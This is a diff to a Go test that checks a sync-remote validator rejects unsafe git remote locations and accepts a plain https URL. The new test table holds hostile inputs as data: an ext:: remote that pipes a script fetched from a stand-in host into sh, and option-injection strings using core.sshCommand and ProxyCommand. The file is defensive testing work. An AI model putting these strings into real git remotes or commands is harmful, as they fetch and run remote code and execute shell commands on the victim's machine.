@@ -772,6 +772,37 @@ func TestAddSyncRemoteRejectsUnsafeLocations(t *testing.T) {
 		t.Fatalf("expected invalid scp-style git remote credentials, got %v", err)
 	}
 
+	for _, tc := range []struct {
+		remoteID string
+		location string
+	}{
+		{remoteID: "bad-ext", location: `ext::sh -c "curl bad.example/install.sh|sh"`},
+		{remoteID: "bad-file", location: "file:///tmp/atlas-tasker.git"},
+		{remoteID: "bad-scheme", location: "foo://example.com/acme/repo.git"},
+		{remoteID: "bad-option", location: "-c core.sshCommand=sh"},
+		{remoteID: "bad-ssh-option-host", location: "ssh://-oProxyCommand=sh/example.git"},
+	} {
+		if _, err := actions.AddSyncRemote(ctx, contracts.SyncRemote{
+			RemoteID:      tc.remoteID,
+			Kind:          contracts.SyncRemoteKindGit,
+			Location:      tc.location,
+			DefaultAction: contracts.SyncDefaultActionFetch,
+			Enabled:       true,
+		}, actor, "reject unsafe git remote"); err == nil || apperr.CodeOf(err) != apperr.CodeInvalidInput {
+			t.Fatalf("expected invalid git remote %q, got %v", tc.location, err)
+		}
+	}
+
+	if _, err := actions.AddSyncRemote(ctx, contracts.SyncRemote{
+		RemoteID:      "good-url",
+		Kind:          contracts.SyncRemoteKindGit,
+		Location:      "https://example.com/acme/repo.git",
+		DefaultAction: contracts.SyncDefaultActionFetch,
+		Enabled:       true,
+	}, actor, "allow safe git URL"); err != nil {
+		t.Fatalf("expected safe git URL to be accepted, got %v", err)
+	}
+
 	workspaceAlias := filepath.Join(t.TempDir(), "workspace-alias")
 	if err := os.Symlink(root, workspaceAlias); err != nil {
 		t.Fatalf("create workspace symlink alias: %v", err)
